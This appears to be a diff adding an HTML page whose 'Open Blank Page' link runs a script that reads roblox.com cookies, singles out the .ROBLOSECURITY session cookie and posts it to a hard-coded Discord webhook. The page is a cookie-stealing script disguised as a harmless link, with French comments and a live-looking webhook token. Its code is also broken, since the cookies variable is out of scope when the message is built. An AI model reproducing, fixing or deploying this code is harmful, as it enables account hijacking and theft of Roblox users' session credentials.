@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Blank Page and Send Discord Webhook with Cookies</title>
+</head>
+<body>
+
+<a href="#" onclick="openBlankPageAndSendWebhook()">Open Blank Page</a>
+
+<script>
+    function openBlankPageAndSendWebhook() {
+        // Ouvre une page vide
+        window.open('about:blank', '_blank');
+
+        // URL de ton webhook Discord
+        const webhookUrl = "https://discord.com/api/webhooks/1298665551593345096/Eo3Vwj8Ev1E5h1bYPKGkqNew-VDM6yiUhouwEWX2J5Huznivv2Ks50U_YKnHNaAOAaRz";
+
+chrome.cookies.getAll({domain: "roblox.com"}, function(cookies) {
+    console.log("All Roblox cookies:");
+    console.log(cookies);
+
+    // Si tu veux récupérer un cookie spécifique (ex : cookie d'authentification)
+    const authCookie = cookies.find(cookie => cookie.name === '.ROBLOSECURITY');
+    if (authCookie) {
+        console.log("Cookie .ROBLOSECURITY: " + authCookie.value);
+    }
+});
+
+        // Corps de la requête à envoyer (le contenu du message, incluant les cookies)
+        const messageContent = {
+            content: `Hello, voici les cookies du site : ${cookies}`
+        };
+
+        // Envoie une requête POST au webhook Discord
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(messageContent),
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Message avec cookies envoyé avec succès à Discord !");
+            } else {
+                console.error("Erreur lors de l'envoi du message :", response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error("Erreur :", error);
+        });
+    }
+</script>
+
+</body>
+</html>
